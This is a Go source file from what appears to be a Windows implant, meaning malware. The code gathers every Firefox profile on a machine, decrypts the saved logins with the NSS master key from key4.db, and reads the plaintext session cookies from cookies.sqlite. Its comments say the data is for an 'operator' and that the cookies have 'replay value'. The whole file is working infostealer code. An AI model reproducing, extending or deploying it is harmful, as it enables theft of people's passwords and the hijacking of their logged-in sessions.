//go:build windows

package services

import (
	"fmt"
	"path/filepath"
	"strings"

	"implant/core/debuglog"
)

// Firefox（NSS）凭据采集的 Windows 驱动。
//
// 与 Chromium 系的区别：
//   - 口令在 logins.json 里，字段用 NSS 主密钥（key4.db）加密 —— 解密算法见
//     firefox_nss.go / nss_crypto.go / pkcs12.go（对着真实 Firefox 产物验证过）；
//   - Cookie 在 cookies.sqlite 里且**明文**（Firefox 不加密 Cookie），直接读即可。
//
// 主口令（master password）暂不支持：设了主口令的 profile 会在 nssMasterKey 里失败，
// 这里把失败记进 Errors 而不是静默跳过 —— 现场需要知道"这个 profile 有数据但解不开"。

// collectFirefoxProfiles 采集本机所有 Firefox profile 的登录口令与 Cookie。
//
// 单个 profile 失败不影响其它 profile（与 Chromium 侧同样的取舍）。
func collectFirefoxProfiles() ([]CollectedProfile, []string) {
	dirs := nssFirefoxProfileDirs()
	if len(dirs) == 0 {
		return nil, []string{"未发现 Firefox 配置目录（没有含 key4.db 的 profile）"}
	}

	var out []CollectedProfile
	var errs []string
	for _, dir := range dirs {
		profName := filepath.Base(dir)
		prof := CollectedProfile{
			Name: "firefox", Profile: profName, UserDataDir: dir, Tech: "nss",
		}

		logins, err := nssExtractFirefox(dir, nil)
		if err != nil {
			errs = append(errs, fmt.Sprintf("firefox %s: %v", profName, err))
		} else {
			for _, l := range logins {
				// 半解开的条目不丢弃：记进 Errors 让操作员知道它存在、缺的是哪半
				if !l.Complete() {
					errs = append(errs, fmt.Sprintf("firefox %s: %s 有未解开的字段（user: %s / pass: %s）",
						profName, l.URL, errOrOK(l.UsernameError), errOrOK(l.PasswordError)))
					continue
				}
				prof.Credentials = append(prof.Credentials, CollectedCredential{
					URL: l.URL, User: l.Username, Pass: l.Password,
					Browser: "firefox", Profile: profName,
				})
				if len(prof.Credentials) >= maxCredentialItems {
					break
				}
			}
		}

		cookies, cerr := readFirefoxCookies(dir)
		if cerr != nil {
			// 没有 cookies.sqlite 很常见（新 profile / 从没存过 Cookie），不算错误
			if !strings.Contains(cerr.Error(), "不存在") {
				errs = append(errs, fmt.Sprintf("firefox %s: %v", profName, cerr))
			}
		} else {
			prof.Cookies = cookies
		}

		if len(prof.Credentials) == 0 && len(prof.Cookies) == 0 {
			continue // 空 profile（新建的），不占制品
		}
		out = append(out, prof)
	}
	return out, errs
}

// readFirefoxCookies 读 moz_cookies 表（明文，无需解密）。
//
// 列名按 Firefox 的建表语句：host / name / value / path / expiry /
// isSecure / isHttpOnly（大小写敏感，SQLite 里就是驼峰）。
func readFirefoxCookies(profileDir string) ([]CollectedCookie, error) {
	path := filepath.Join(profileDir, "cookies.sqlite")
	db, cleanup, err := openBrowserDB(path)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	tb, err := db.Table("moz_cookies")
	if err != nil {
		return nil, fmt.Errorf("打开 moz_cookies 失败: %w", err)
	}
	rows, err := tb.Rows(nil)
	if err != nil {
		return nil, fmt.Errorf("读取 moz_cookies 失败: %w", err)
	}

	out := make([]CollectedCookie, 0, len(rows))
	for _, r := range rows {
		name := stringValue(r["name"])
		host := stringValue(r["host"])
		val := stringValue(r["value"])
		if name == "" || host == "" || val == "" {
			continue // 空值 Cookie 没有回放价值，写进库只会污染列表
		}
		out = append(out, CollectedCookie{
			Host: host, Name: name, Value: val,
			Path:     stringValue(r["path"]),
			Expires:  intValue(r["expiry"]),
			Secure:   intValue(r["isSecure"]) != 0,
			HTTPOnly: intValue(r["isHttpOnly"]) != 0,
		})
		if len(out) >= maxCookieItems {
			break
		}
	}
	if len(out) > 0 {
		debuglog.Printf("🔑 [BROWSER] Firefox profile %s: %d 条 Cookie（明文）\n",
			filepath.Base(profileDir), len(out))
	}
	return out, nil
}

// errOrOK 把空错误串渲染成 "ok"，便于拼进 errors 文案
func errOrOK(s string) string {
	if s == "" {
		return "ok"
	}
	return s
}
